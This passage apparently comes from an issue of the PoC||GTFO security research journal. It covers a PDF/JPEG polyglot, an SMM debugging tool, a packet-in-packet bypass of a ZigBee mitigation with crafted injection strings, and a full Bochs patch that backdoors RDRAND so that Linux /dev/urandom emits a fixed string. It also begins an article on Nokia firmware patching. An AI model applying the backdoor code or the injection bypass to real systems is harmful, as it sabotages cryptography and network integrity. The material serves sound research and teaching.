just as simple as my calculator; in fact, it was simpler because it did not have the complexity of managing
a tiny amount of memory.
There is an old name for what people do with Big Ideas and Important Concepts that are so important
that you cannot hope to have their internal workings understood without special training by special people.
It is called worshiping idols, and what we ought to do with idols is to smash them to bits.
And if the bits do not make sense, then the whole of a Most Modern Capitalized Fashion does not make
sense, and the special people are merely priests promising that supplicating the idol will improve your affairs.
Not that anything is wrong with priests, but idols teach no skills, and if your trust is in your skill, then you
should seek a different temple and a different augur. Or, better yet, build your own damned bird-feeder!
–——–
———
—–—–
———
–—–
——–
—
––—–
———
Verily I say to you that when they keep uttering some words in such a way that you hear Capital Letters,
look ’em in the eye and ask ’em: “how does this work?” Also remember that “I don’t really know” is an
acceptable answer, and the one who gives it is your potential ally.
I was brought to a place where they worshiped idols called Commutativity and Associativity, or else
Inheritance and Polymorphism, and where they made sacrifices of their children’s time to these idols. They
made many useless manuscripts that would break a mule’s back but which these children had to carry to
and from school. And making a whip of cords, I drove them all out of the temple, screaming “This is a waste
of time and paper! Trees will grow back hundredfold if you let them alone, for nature cannot be screwed,
but who will restore to the old the lost time of their youth?”
They taught, “Lo this is Commutative and Higher Order, or else this is a Reference, and this is a Pointer.”
And when I asked them, “How do you add numbers, and how does your linker work?”, they demurred and
spoke of Abstraction and Patterns. Verily I tell you, if you don’t know how to do your Abstractions on
paper and what they compile into, you are worshiping idols and wasting your time. And if you teach that
to children, you are sacrificing their time and their minds to your graven images. Repent and smash your
graven idols to bits, and teach your children about the smashing and the bits and the bytes instead, for these
are the only skills that matter!
6Seriously, try to do the math.
73
This PDF is a JPEG; or,
This Proof of Concept is a Picture of Cats
by Ange Albertini
In this short little article, I’ll teach you how to combine a PDF and a JPEG into a single polyglot file
that is legal and meaningful in both languages.
The JPEG format requires its Start Of Image signature, FF D8, at offset 0x00, exactly. The PDF format
officially requires its %PDF-1.x signature to be at offset 0x00, but in practice most interpreters only require
its presence within the first 1,024 bytes of the files. Some readers, such as Sumatra, don’t require the header
at all.
In previous issues of this journal, you saw how a neighbor can combine a PDF document with a ZIP
archive (PoCkGTFO 01:05) or a Master Boot Record (PoCkGTFO 02:08), so you should already know the
conditions to make a dummy PDF object. The trick is to fit a fake obj stream in the first 1024 bytes
containing whatever your second file demands, then to follow that obj stream with the contents of your
real PDF.
To make these two formats play well together, we’ll make our first insert object stream clause of the
PDF contain a JPEG comment, which will usually start at offset 0x18. Our PDF comment will cause the
PDF interpreter ignore the remaining JPEG data, and the actual PDF content can continue afterward.
Unfortunately, since version 10.1.5, Adobe Reader rejects PDF files that start like a JPEG file ought to.
It’s not clear exactly why, but as all official segments’ markers start with FF, this is what Adobe Reader
checks to identify a JPEG file. Adobe PDF Reader will reject anything that begins with FF D8 FF as a
JPEG.
However, a large number of JPEG files start with an APP0 segment containing a JFIF signature. This
begins with an FF E0 marker, so most JPEG viewers don’t mind this in place of the expected APP0 marker.
Just changing that FF E0 marker at offset 0x02 to anything else will give will give us a supported JPEG
and a PDF that our readers can enjoy with Adobe’s software.
Some picky JPEG viewers, such as those from Apple, might still require the full sequence FF D8 FF E0
to be patched manually at the top of pocorgtfo03.pdf to enjoy our cats, Calisson and Sarkozette.
8Offset
0000
0010
0020
0030
0040
0050
0060
0070
0080
0090
00a0
00b0
00c0
00d0
00e0
00f0
0100
00
ff
00
35
0a
03
04
0e
15
43
14
14
14
14
11
01
06
00
01
d8
c7
0a
73
02
05
12
15
01
14
14
14
14
01
00
07
00
02
00
00
39
74
02
0a
10
0c
03
14
14
14
ff
03
00
08
00
03
00
00
39
72
03
07
0d
0f
04
14
14
14
c2
11
00
ff
00
04
00
ff
39
65
03
07
0e
17
04
14
14
14
00
01
00
c4
00
05
10
fe
20
61
03
06
11
18
05
14
14
14
11
ff
00
00
00
06
4a
00
30
6d
03
08
0e
16
04
14
14
14
08
c4
00
1a
00
07
46
22
20
0a
04
0c
0b
14
05
14
14
14
03
00
00
01
00
08
49
0a
6f
ff
03
0a
0b
18
09
14
14
14
78
1c
00
01
00
9
09
46
25
62
db
03
0c
10
12
05
14
14
14
06
00
00
01
01
0A
00
50
6a
00
04
0c
16
14
05
14
14
14
b3
00
00
01
02
0B
01
44
0a
43
05
0b
10
15
09
14
14
14
03
03
01
01
04
0C
01
46
3c
00
08
0a
11
14
14
14
14
14
01
01
02
01
03
0D
01
2d
3c
03
05
0b
13
ff
0d
14
14
14
11
00
03
01
05
0E
00
31
3e
02
05
0b
14
db
0b
14
14
14
00
03
04
01
06
0F
c7
2e
3e
02
04
0d
15
00
0d
14
14
14
02
01
05
00
ff
ASCII
......JFIF......
.......".%PDF-1.
5.999 0 obj.<<>>
.stream....C....
................
................
................
................
C...............
................
................
................
........x.......
................
................
................
................4
NetWatch:
System Management Mode is not just for Governments.
by Joshua Wise and Jacob Potter
Neighbors, by now you have heard of a well known state’s ex-
plorations into exciting and exotic malware. The astute amongst
you may have had your ears perk up upon hearing of SCHOOL-
MONTANA, a System Management Mode rootkit. You might
wonder, how can I get some of that SMM goodness for myself ?
Before we dive too deeply, we’ll take a moment to step back
and remind our neighbors of the many wonders of System Man-
agement Mode. Our friends at Intel bestowed SMM unto us
with the i386SL, a low-power variant of the ‘386. When they
realized that it would become necessary to provide power man-
agement features without modifying existing operating systems,
they added a special mode in which execution could be trans-
parently vectored away from whatever code be running at the
time in response to certain events. For instance, vendors could
use SMM to dynamically power sound hardware up and down
in response to access attempts, to control backlights in response
to keypresses, or even to suspend the system!
On modern machines, SMM emulates classic PS/2 keyboards
before USB drivers have been loaded. It also manages BIOS up-
dates, and at times it is used to work around defects in the hard-
ware that Intel has given us. SMM is also intricately threaded
into ACPI, but that’s beyond the scope of this little article.
All of this sounds appetizing to the neighbor who hungers for deeper control over their computer. Beyond
the intended uses of SMM, what else can be done with the building blocks? Around the same time as the
well known state built SCHOOLMONTANA and friends, your authors built a friendlier tool, NetWatch. We
bill NetWatch as a sort of lights-out box for System Management Mode. The theory of operation is that
by stealing cycles from the host process and taking control over a secondary NIC, NetWatch can provide
a VNC server into a live machine. With additional care, it can also behave as a GDB server, allowing for
remote debugging of the host operating system.
We invite our neighbors to explore our work in more detail, and build on it should you choose to. It runs
on older hardware, the Intel ICH2 platform to be specific, but porting it to newer hardware should be easy
if that hardware is amenable to loading foreign SMM code or if an SMM vulnerability is available. Like all
good tools in this modern era, it is available on GitHub. 1
We take the remainder of this space to discuss some of the clever tricks that were necessary to make
NetWatch work.
4.1
A thief on the PCI bus.
To be able to communicate with the outside world, NetWatch needs a network card of its own. One problem
with such a concept is that the OS might want to have a network card, too; and, indeed, at boot time, the
OS may steal the NIC from however NetWatch has programmed it. We employ a particularly inelegant hack
to keep this from happening.
The obvious thing to do would be to intercept PCI configuration register accesses so that the OS would
be unable to even prove that the network card exists! Unfortunately, though there are many things that a
System Management Interrupt can be configured to trap on, PCI config space access is not a supported trap
1 https://github.com/jwise/netwatch
10on ICH2. ICH2 does provide for port I/O traps on the Southbridge, but PCI peripherals are attached to the
Northbridge on that generation. This means that directly intercepting and emulating the PCI configuration
phase won’t work.
We instead go and continuously “bother” PCI peripherals that we wish to disturb. Every time we trap
into system management mode—which we have configured to be once every 64ms—we write garbage values
over the top of the card’s base address registers. This effectively prevents Linux from configuring the card.
When Linux attempts to do initial detection of the card, it times out waiting for various resources on the
(now-bothered) card, and does not succeed in configuring it.
Neighbors who have ideas for more effectively hiding a PCI peripheral from a host are encouraged to
share their PoC with us.
4.2
Single-stepping without hardware breakpoints.
In a GDB slave, one of the core operations is to single-step. Normally, single-step is implemented using the
TF bit in the FLAGS/EFLAGS/RFLAGS register, which causes a debug exception at the end of the next
instruction after it is set. The kernel can set TF as part of an IRET, which causes the CPU to execute
one instruction of the program being debugged and then switch back into the kernel. Unfortunately Intel,
in all their wisdom, neglected to provide an analog of this feature for SMM. When NetWatch’s GDB slave
receives a single-step command, it needs to return from SMM and arrange for the CPU to execute exactly
one instruction before trapping back in to SMM. If Intel provides no bit for this, how can we accomplish it?
Recall that the easiest way to enter SMM is with an I/O port trap. On many machines, port 0xB2 is
used for this purpose. You may find that MSR SMI_ON_IO_TRAP_0 (0xC001_0050) has already been
suitably set. NetWatch implements single-step by reusing the standard single-step exception mechanism
chained to an I/O port trap.
Suppose the system was executing a program in user-space when NetWatch stopped it. When we receive
a single step command, we must insert a soft breakpoint into the hard breakpoint handler. This takes the
form of an OUT instruction that we can trap into the #DB handler that we otherwise couldn’t trap.
• Track down the location of the IDT and the target of the #DB exception handler.
• Replace the first two bytes of that handler with E6 B2, “out %al, $0xb2”
• Save the %cs and %ss descriptor caches from the SMM saved state area into reserved spots in SMRAM.
• Return from SMM into the running system.
Now that SMM has ceded control back to the regular system, the following will happen.
• The system executes one instruction of the program being debugged.
• A #DB exception is triggered.
• If the system was previously in Ring 3, it executes a mode switch into Ring 0 and switches to the
kernel stack. Then it saves a trap frame and begins executing the #DB handler.
• The #DB handler has been replaced with out %al, $0xb2.
Finally, the OUT instruction triggers a System Management Interrupt into our SMM toolkit.
• The SMI handler undoes the effect of the exception that just happened: it restores RIP, CS, RFLAGS,
RSP, and SS from the stack, and additionally restores the descriptor caches from their saved copy in
SMRAM. It also replaces the first two bytes of the #DB handler.
• NetWatch reports the new state of the system to the debugger. At this point, a single X86 instruction
step has been executed outside of SMM mode.
114.3
Places to go from here.
NetWatch was written as a curiosity, but having a framework to explore System Management Mode is
damned valuable. Those with well-woven hats will also enjoy this opportunity to disassemble SMM firmware
on their own systems. SMM has wondrous secrets hidden within it, and it is up to you to discover them!
The authors offer the finest of greets to Dr. David A. Eckhardt and to Tim Hockin for their valuable
guidance in the creation of NetWatch.
12G
H
F
E
I
D
Ч
J
Г
Ф
Е
Ц
Й
K
C
Д
И
К
L
B
Б
Л
.
М
M
З
Н
N
Z
Ы
О
O
A
А
Y
Х
П
Я
P
X
Ш
В
Р
С
W
У
Т
Q
V
R
S
U
T
R t . R v d
. D
r .
P a
s t
T o t a l
l y
U s
e l
e
T
h
i
s
m i
g h
t
a
T h
i s
.
i s
е О в а л т и н
н к М о р
е !
Д р и
Hey kids!
Xerox this page and cut out the crypto wheel.
You can write your own secret messages that only idiots can’t read!
13
.Hey kids!
Xerox this page and cut the paper strips apart.
You can write your own odd-alignment packet-in-packet injection strings!
145
An Advanced Mitigation Bypass for Packet-in-Packet; or,
I’m burning 0day to use the phrase ‘eighth of a nybble’ in print.
by Travis Goodspeed
continuing work begun in collaboration with the Dartmouth Scooby Crew
Howdy y’all,
This short little article is a follow-up to my work on 802.15.4 packet-in-packet attacks, as published at
Usenix WOOT 2011. In this article, I’ll show how to craft PIP exploits that avoid the defense mechanisms
introduced by the fine folks at Carleton University in Ontario.
As you may recall, the simple form of the packet-in-packet attack works by including the symbols that
make up a Layer 1 packet at Layer 7. Normally, the interior bytes of a packet are escaped by the outer
packet’s header, but packet collisions sometimes destroy that header. However, collisions tend to be short
and so leave the interior packet intact. On a busy band like 2.4GHz, this happens often enough that it can
be used reliably to inject packets in a remote network.
At Wireless Days 2012, Biswas and company released a short paper entitled A Lightweight Defence
against the Packet in Packet Attack in ZigBee Networks. Their trick is to use bit-stuffing of a sort to prevent
control information from appearing within the payload. In particular, whenever they see four contiguous 00
symbols, they stuff an extra FF before the next symbol in order to ensure that the Zigbee packet’s preamble
and Start of Frame Delimiter (also called a Sync) are never found back-to-back inside of a transmitted packet.
So if the attacker injects 00 00 00 00 A7 ... as in the original WOOT paper, Biswas’ mitigation would
send 00 00 00 00 FF A7 ... through the air, preventing a packet-in-packet injection. The receiving unit’s
networking stack would then transform this back to the original form, so software at higher layers could be
none-the-wiser.
One simple bypass is to realize that the receiving radio may not in fact need four bytes of preamble. An
upcoming tech report 2 from Dartmouth shows that the Telos B does not require more than one preamble
byte, so 00 00 A7 ... would successfully bypass Biswas’ defense.
Another way to bypass this defense is to realize that 802.15.4 symbols are four bits wide, so you can
abuse nybble alignment to sneak past Biswas’ encoder. In this case, the attacker would send something like
F0 00 00 00 0A 7..., allowing for eight nybbles, which are four misaligned bytes, of zeroes to be sent in a
row without tripping the escaping mechanism. When the outer header is lost, the receiver will automatically
re-align the interior packet.
–——–
———
—–—–
———
–—–
——–
—
––—–
———
But those are just bugs, easily identified and easily patched. Let’s take a look at a full and proper
bypass, one that’s dignified and pretty damned difficult to anticipate. You see, byte boundaries in the
symbol stream are just an accidental abstraction that doesn’t really exist in the deepest physical layers, and
they are not the only abstraction the hardware ignores. By finding and violating these abstractions—while
retaining compatibility with the hardware receiver!—we can perform a packet-in-packet injection without
getting caught by the filter.
You’ll recall that I told you 802.15.4 symbols were nybble-sized. That’s almost true, but strictly speaking,
it’s a comforting lie told to children. The truth is that there’s a lower layer, where each nybble of the message
is sent as 32 ones and zeroes, which are called ‘chips’ to distinguish them from higher-layer bits.
2 Fingerprinting
IEEE 802.15.4 Devices by Ira Ray Jenkins and the Dartmouth Scooby Crew, TR2014-746
15The symbols and chip sequences are defined like this in the 802.15.4 standard. As each chip sequence has
a respectably large Hamming distance from the others, an error-correcting symbol matcher on the receiving
end can find the closest match to a symbol that arrives damaged. 3 This fix is absolutely transparent—by
design—to all upper layers, starting with the symbol layer where SFD is matched to determine where a
packet starts.
0
1
2
3
4
5
6
7
−−
−−
−−
−−
−−
−−
−−
−−
1 10 11001110000110101001000101110
1 11 01101100111000011010100100010
0 01 01110110110011100001101010010
0 01 00010111011011001110000110101
0 10 10010001011101101100111000011
0 01 10101001000101110110110011100
1 10 00011010100100010111011011001
1 00 11100001101010010001011101101
8
9
A
B
C
D
E
F
−−
−−
−−
−−
−−
−−
−−
−−
10001100100101100000011101111011
10111000110010010110000001110111
01111011100011001001011000000111
01110111101110001100100101100000
00000111011110111000110010010110
01100000011101111011100011001001
10010110000001110111101110001100
11001001011000000111011110111000
That is, the Preamble of an 802.15.4 packet can be written as either 00 00 00 00 or eight repetitions of
the zero symbol 11011001110000110101001000101110. While Biswas wants to escape any sequences of the
interior symbols, he is actually just filtering at the byte level. Filtering at the symbol level would help, but
even that could be bypassed by misaligned symbols.
“What the hell are misaligned symbols!?” you ask. Read on and I’ll show you how to obfuscate a PIP
attack by sending everything off by an eighth of a nybble.
–——–
———
—–—–
———
–—–
——–
—
––—–
———
I took the above listing, printed it to paper, and cut the rows apart. Sliding the rows around a bit shows
that the symbols form two rings, in which rotating by an eighth of the length causes one symbol to line up
with another. That is, if the timing is off by an eighth of a nybble, a 0 might be confused for a 1 or a 7.
Two eighths shift of a nybble will produce a 2 or a 6, depending upon the direction.
0
1
2
3
4
5
6
7
11011001110000110101001000101110 / 10001100100101100000011101111011
11101101100111000011010100100010 / 10111000110010010110000001110111
00101110110110011100001101010010 / 01111011100011001001011000000111
00100010111011011001110000110101 / 01110111101110001100100101100000
01010010001011101101100111000011 / 00000111011110111000110010010110
00110101001000101110110110011100 / 01100000011101111011100011001001
11000011010100100010111011011001 / 10010110000001110111101110001100
10011100001101010010001011101101 / 11001001011000000111011110111000
8
9
A
B
C
D
E
F
This technique would work for chipwise translations of any shift, but it just so happens that all translations
occur in four-chip chunks because that’s how the 802.15.4 symbol set was designed. Chip sequences this long
are terribly difficult to work with in binary, and the alignment is convenient, so let’s see them as hex. Just
remember that each of these nybbles is really a chip-nybble, which is one-eighth of a symbol-nybble.
0
D9C3522E
1
ED9C3522
2
2ED9C352
3
22ED9C35
4
522ED9C3
5
3522ED9C
6 C3522ED9
7 9C3522ED
8
8C96077B
9
B8C96077
A
7B8C9607
B
77B8C960
C
077B8C96
D
6077B8C9
E 96077B8C
F C96077B8
So now that we’ve got a denser notation, let’s take a look at the packet header sequence that is blocked
by Biswas, namely, the 4-bytes of zeroes. In this notation, the upper line represents 802.15.4 symbols, while
the lower line shows the 802.15.4 chips, both in hex.
0
0
0
0
0
0
0
0
D9C3522E D9C3522E D9C3522E D9C3522E D9C3522E D9C3522E D9C3522E D9C3522E
As this sequence is forbidden (i.e., will be matched against by Biswas’ bit stuffing trick) at the upper
layers, we’d like to smuggle it through using misaligned symbols. In this case, we’ll send 1 symbols instead
3 Note that Hamming-distance might not be the best metric to match the symbol. Other methods, such as finding the longest
stretch of perfectly-matched chips, will still work for the bypass presented in this article.
16of 0 symbols, as shown on the lower half of the following diagram. Note how damned close they are to the
upper half. At most one eighth of any symbol is wrong, and within a stretch of repeated symbols, every chip
is correct.
0
0
0
0
0
0
0
0
D9C3522E D9C3522E D9C3522E D9C3522E D9C3522E D9C3522E D9C3522E D9C3522E
1
1
1
1
1
1
1
1
ED9C3522 ED9C3522 ED9C3522 ED9C3522 ED9C3522 ED9C3522 ED9C3522 ED9C3522
So instead of sending our injection string as 00000000A7, we can move forward or backward one spot in
the ring, sending 11111111B0 or 7777777796 as our packet header and applying the same shift to all the
remaining symbols in the packet.
“But wait!” you might ask, “These symbols aren’t correct! Between 0 and 4 chips of the shifted symbol
fail to match the original.”
The trick here is that the radio receiver must match any incoming chip sequence to some output symbol.
To do this, it takes the most recent 32 chips it received and returns the symbol from the table that has the
least Hamming distance from the received sample.
So when the radio is looking for A7 and sees B0, the error calculation looks a little like this.
BO −− 77B8C960D9C3522E
||||||||
A7 −− 7B8C96079C3522ED
<−−Chips a r e n e a r l y e q u a l .
For the first symbol, the receiver expects the A symbol as 7B8C9607 but it gets 7B8C960D. Note that
these only differ by the last four chips, and that the Hamming distance between 0111 and 1101 is only two,
so the difference between an A and a misaligned B in this case is only two.
It’s easy to show that the worst off-by-one misalignment would make the Hamming distance differ by at
most four. Comparing this with the distance between the existing symbols, you will see that they are all
much further apart from one other. So we can obfuscate an entire inner packet, letting the receiver and a
bit of radioland magic translate our packet from legal symbols into ones that ought to have been escaped.
Ain’t that nifty?
–——–
———
—–—–
———
–—–
——–
—
––—–
———
This technique of abusing sub-symbol misalignment to send a corrupted packet-in-packet which is reliably
transformed back into a correct, meaningful packet should be portable to protocols other than 802.15.4.
For example, most Phase Shift Keyed (PSK) protocols can have phase misalignment that causes symbols
to be confused for each other. Frequency Shift Keyed (FSK) protocols can have frequency misalignment
when on neighboring channels, so that sometimes one channel in 2 FSK will see a packet intended for a
neighboring channel, but with all or most of the bits flipped.
One last subject I should touch on is a fancy attempt by Michael Ossmann and Dominic Spill to defend
against packet-in-packet attacks which was presented at Shmoocon 2014 and in a post to the Langsec mailing
list. While they don’t explicitly anticipate the bypass presented in this paper, it’s worth noting that their
example (5,2,2) Isolated Complementary Binary Linear Block Code (ICBLBC) does not seem to be vulnerable
to my advanced bypass technique. Could it be that all such codes are accidentally invulnerable?
Evan Sultanik on the Digital Operatives Blog ported Mike and Dominic’s technique for generating codes
to Microsoft’s Z3 theorem prover and came up with a number of new ICBLBC codes.
With so many to choose from, surely a clever reader could extend Evan’s Z3 code to search just for
those ICBLBC codes which are vulnerable to type confusion with misalignment? I’ll buy a beer for the
first neighbor to demo such a PoC, and another beer for the first neighbor to convincingly extend Mike and
Dominic’s defense to cover misaligned symbols. For inspiration, read about how Barisani and Bianco 4 were
able to do packet-in-packet injections by ignoring Layer 1 and injecting at Layer 2.
Cheers from Samland,
—Travis
4 Fully Arbitrary 802.3 Packet Injection: Maximizing the Ethernet Attack Surface by Andrea Barisani and Daniele Bianco
at Black Hat 2013
176
Prototyping an RDRAND Backdoor in Bochs
by Taylor Hornby
What happens to the Linux cryptographic random number generator when we assume Intel’s fancy new
RDRAND instruction is malicious? According to dozens of clueless Slashdot comments, it wouldn’t matter,
because Linux tosses the output of RDRAND into the entropy pool with a bunch of other sources, and those
sources are good enough to stand on their own.
I can’t speak to whether RDRAND is backdoored, but I can—and I do!—say that it can be backdoored.
In the finest tradition of this journal, I will demonstrate a proof of concept backdoor to the RDRAND
instruction on the Bochs emulator that cripples /dev/urandom on recent Linux distributions. Implementing
this same behavior as a microcode update is left as an exercise for clever readers.
–——–
———
—–—–
———
–—–
——–
—
––—–
———
Let’s download version 3.12.8 of the Linux kernel source code and see how it generates random bytes.
Here’s part of the extract_buf() function in drivers/char/random.c, the file that implements both
/dev/random and /dev/urandom.
static void extract_buf(struct entropy_store *r, __u8 *out){
// ... hash the pool and other stuff ...
/* If we have a architectural hardware random number
* generator, mix that in, too. */
for (i = 0; i < LONGS(EXTRACT_SIZE); i++) {
unsigned long v;
if (!arch_get_random_long(&v))
break;
hash.l[i] ^= v;
}
memcpy(out, &hash, EXTRACT_SIZE);
memset(&hash, 0, sizeof(hash));
}
This function does some tricky SHA1 hashing stuff to the entropy pool, then XORs RDRAND’s output
with the hash before returning it. That arch_get_random_long() call is RDRAND. What this function
returns is what you get when you read from /dev/(u)random.
What could possibly be wrong with this? If the hash is random, then it shouldn’t matter whether
RDRAND output is random or not, since the result will still be random, right?
That’s true in theory, but the hash value is in memory when the RDRAND instruction executes, so
theoretically, it could find it, then return its inverse so the XOR cancels out to ones. Let’s see if we can do
that.
First, let’s look at the X86 disassembly to see what our modified RDRAND instruction would need to
do.
c03a_4c80:
c03a_4c82:
c03a_4c87:
c03a_4c8a:
c03a_4c8c:
c03a_4c8e:
c03a_4c90:
c03a_4c93:
c03a_4c95:
89
b9
8d
85
74
31
83
39
75
d9
00 00 00 00
76 00
c9
09
02
c2 04
f2
e9
mov
mov
lea
test
je
xor
add
cmp
jne
18
ecx,ebx
ecx,0x0
; \__These become
esi,[esi+0x0]
; / "rdrand eax"
ecx,ecx
c03a4c97
DWORD PTR [edx],eax
edx,0x4
edx,esi
c03a4c80That mov ecx, 0, lea esi [esi+0x0] code gets replaced with rdrand eax at runtime by the alterna-
tives system. See arch/x86/include/asm/archrandom.h and arch/x86/include/asm/alternative.h for
details.
Sometimes things work out a little differently, and it’s best to be prepared for that. For example if the
kernel is compiled with CONFIG_CC_OPTIMIZE_FOR_SIZE=y, then the call to arch_get_random_long() isn’t
inlined. In that case, it will look a little something like this.
c030_76e6:
c030_76e8:
c030_76ea:
c030_76ee:
c030_76f3:
c030_76f5:
c030_76f7:
c030_76fb:
c030_76fd:
c030_7700:
39
74
8d
e8
85
74
8b
31
83
eb
fb
18
44
cd
c0
0b
44
03
c3
e4
24 0c
fc ff ff
24 0c
04
cmp
je
lea
call
test
je
mov
xor
add
jmp
ebx,edi
c0307702
eax,[esp+0xc]
c03073c0
eax,eax
c0307702
eax,DWORD PTR [esp+0xc]
DWORD PTR [ebx],eax
ebx,0x4
c03076e6
Not to worry, though, since all cases that I’ve encountered have one thing in common. There’s always a
register pointing to the buffer on the stack. So a malicious RDRAND instruction would just have to find a
register pointing to somewhere on the stack, read the value it’s pointing to, and that’s what the RDRAND
output will be XORed with. That’s exactly what our PoC will do.
I don’t have a clue how to build my own physical X86 CPU with a modified RDRAND, so let’s use the
Bochs X86 emulator to change RDRAND. Use the current source from SVN since the most recent stable
version as I write this, 2.6.2, has some bugs that will get in our way.
All of the instructions in Bochs are implemented in C++ code, and we can find the RDRAND instruction’s
implementation in cpu/rdrand.cc. It’s the BX_CPU_C::RDRAND_Ed() function. Let’s replace it with a
malicious implementation, one that sabotages the kernel, and only the kernel, when it tries to produce
random numbers.
BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::RDRAND_Ed(bxInstruction_c *i){
Bit32u rdrand_output = 0;
Bit32u xor_with = 0;
Bit32u
Bit32u
Bit32u
Bit32u
ebx
edx
edi
esp
=
=
=
=
get_reg32(BX_32BIT_REG_EBX);
get_reg32(BX_32BIT_REG_EDX);
get_reg32(BX_32BIT_REG_EDI);
get_reg32(BX_32BIT_REG_ESP);
const char output_string[] = "PoC||GTFO!\n";
static int position = 0;
Bit32u addr = 0;
static Bit32u last_addr = 0;
static Bit32u second_last_addr = 0;
/* We only want to change RDRAND’s output if it’s being used for the
* vulnerable XOR in extract_buf(). This only happens in Ring 0.
*/
if (CPL == 0) {
/* The address of the value our output will get XORed with is
* pointed to by one of the registers, and is somewhere on the
* stack. We can use that to tell if we’re being executed in
* extract_buf() or somewhere else in the kernel. Obviously, the
19* exact registers will vary depending on the compiler, so we
* have to account for a few different possibilities. It’s not
* perfect, but hey, this is a POC.
*
* This has been tested on, and works, with 32-bit versions of
* - Tiny Core Linux 5.1
* - Arch Linux 2013.12.01 (booting from cd)
* - Debian Testing i386 (retrieved December 6, 2013)
* - Fedora 19.1
*/
if (esp <= edx && edx <= esp + 256) {
addr = edx;
} else if (esp <= edi && edi <= esp + 256
&& esp <= ebx && ebx <= esp + 256) {
/* With CONFIG_CC_OPTIMIZE_FOR_SIZE=y, either:
* - EBX points to the current index,
*
EDI points to the end of the array.
* - EDI points to the current index,
*
EBX points to the end of the array.
* To distinguish the two, we have to compare them.
*/
if (edi <= ebx) {
addr = edi;
} else {
addr = ebx;
}
} else {
/* It’s not extract_buf(), so cancel the backdooring. */
goto do_not_backdoor;
}
/* Read the value that our output will be XORed with. */
xor_with = read_virtual_dword(BX_SEG_REG_DS, addr);
Bit32u urandom_output = 0;
Bit32u advance_length = 4;
Bit32u extra_shift = 0;
/* Only the first two bytes get used on the third RDRAND
* execution. */
if (addr == last_addr + 4 && last_addr == second_last_addr + 4){
advance_length = 2;
extra_shift = 16;
}
/* Copy the next portion of the string into the output. */
for (int i = 0; i < advance_length; i++) {
/* The characters must be added backwards, because little
* endian. */
urandom_output >>= 8;
urandom_output |= output_string[position++] << 24;
if (position >= strlen(output_string)) {
position = 0;
}
}
urandom_output >>= extra_shift;
20second_last_addr = last_addr;
last_addr = addr;
rdrand_output = xor_with ^ urandom_output;
} else {
do_not_backdoor:
/* Normally, RDRAND would
rdrand_output |= rand() &
rdrand_output <<= 8;
rdrand_output |= rand() &
rdrand_output <<= 8;
rdrand_output |= rand() &
rdrand_output <<= 8;
rdrand_output |= rand() &
}
produce good random output. */
0xff;
0xff;
0xff;
0xff;
BX_WRITE_32BIT_REGZ(i->dst(), rdrand_output);
setEFlagsOSZAPC(EFlagsCFMask);
BX_NEXT_INSTR(i);
}
After you’ve made that patch and compiled Bochs, download Tiny Core Linux to test it. Here’s a sample
configuration to ensure that a CPU with RDRAND support is emulated.
# System configuration.
romimage: file=$BXSHARE/BIOS-bochs-latest
vgaromimage: file=$BXSHARE/VGABIOS-lgpl-latest
cpu: model=corei7_ivy_bridge_3770k, ips=120000000
clock: sync=slowdown
megs: 1024
boot: cdrom, disk
# CDROM
ata1: enabled=1, ioaddr1=0x170, ioaddr2=0x370, irq=15
ata1-master: type=cdrom, path="CorePlus-current.iso", status=inserted
Boot it, then cat /dev/urandom to check the kernel’s random number
generation.
tc@box:~$ cat /dev/urandom | head
PoC||GTFO!
PoC||GTFO!
PoC||GTFO!
PoC||GTFO!
PoC||GTFO!
PoC||GTFO!
PoC||GTFO!
PoC||GTFO!
PoC||GTFO!
PoC||GTFO!
217
Patching Kosher Firmware for Nokia 2720
by Assaf Nativ
D7 90 D7 A1 D7 A3 D7 A0 D7 AA D7 99 D7 91
in collaboration with two anonymous coworkers.
This fun little article will introduce you to methods for patching firmware of the Nokia 2720 and related
feature phones. We’ll abuse a handy little bug in a child function called by the verification routine. This
modification to the child function that we can modify allows us to bypass the parent function that we cannot
modify. Isn’t that nifty?
A modern feature phone can make phone calls, send SMS or MMS messages, manage a calendar, listen
to FM radio, and play Snake. Its web browser is dysfunctional, but it can load a few websites over GPRS
or 3G. It supports Bluetooth, those fancy ringtones that no one ever buys, and a calculator. It can also take
ugly low-resolution photos and set them as the background.
Not content with those unnecessary features, the higher end of modern feature phones such as the Nokia
208.4 support Twitter, WhatsApp, and a limited Facebook client. How are the faithful to study their scripture
with so many distractions?
A Kosher phone would be a feature phone adapted to the unique needs of a particular community of the
Orthodox Jews. The general idea is that they don’t want to be bothered by the outside world in any way,
but they still want a means to communicate between themselves without breaking the strict boundaries they
made. They wanted a phone that could make phone calls or calculate, but that only supported a limited list of
Hasidic ringtones and only used Bluetooth for headphones. They would be extra happy if a few extra features
could be added, such as a Jewish calendar or a prayer time table. While Pastor Laphroaig just wants a phone
that doesn’t ring (except maybe when heralding new PoC), frowns on Facebook, and banishes Tweety-boxes at
the dinner table, this community goes a lot further and wants no Facebook, Twitter, or suchlike altogether.
This strikes the Pastor as a bit extreme, but good fences make good neighbors, and who’s to tell a neighbor
how tall a fence he ought to build? So this is the story of a neigbor who got paid to build such a fence. 5
–——–
———
—–—–
———
–—–
——–
—
––—–
———
I started with a Nokia phone, as they are cost effective for hardware quality and stability. From Nokia I
got no objection to the project, but also no help whatsoever. They said I was welcome to do whatever helps
me sell their phones, but this target group was too small for them to spend any development time on. And
so this is how my quest for the Kosher phone began.
During my journey I had the pleasure of developing five generations of the Kosher phone. These were
built around the Nokia 1208, Nokia 2680, Nokia 2720, Samsung E1195, and the Nokia 208.4. There were a
few models in between that didn’t get to the final stage either because I failed in making a Kosher firmware
for them or because of other reasons that were beyond my control.
I won’t describe all of the tricks I’ve used during the development, because these phones still account for
a fair bit of my income. However, I think the time has come for me to share some of the knowledge I’ve
collected during this project.
It would be too long to cover all of the phones in a single article, so I will start with just one of them,
and just a single part that I find most interesting.
Nokia has quite a few series of phones differ in the firmware structure and firmware protection. SIM-
locking has been prohibited in the Israeli market since 2010, but these protections also exist to keep neighbors
from playing with baseband firmware modifications, as that might ruin the GSM network.
Nokia phones are divided into a number of baseband series. The oldest, DCT1, works with the old analog
networks. DCT3, DCT4 and DCT4+ work with 2G GSM. BB5 is sometimes 2G and sometimes 3G, so far
as I know. And anything that comes after, such as Asha S40, is 3G. It is important to understand that there
are different generations of phones because vulnerabilities and firmware seem to work for all devices within
a family. Devices in different families require different firmware.
5 Disclaimer: No one forces this phone on them; they choose to have it of their own will. No government or agency is involved
in this, and the only motivation that drives customers to use this kind of phone is the community they live in.
22I’ll start with a DCT4+ phone, the Nokia 1208. Nowadays there are quite a few people out there who
know how to patch DCT4+ firmware, but the solution is still not out in the open. One would have to collect
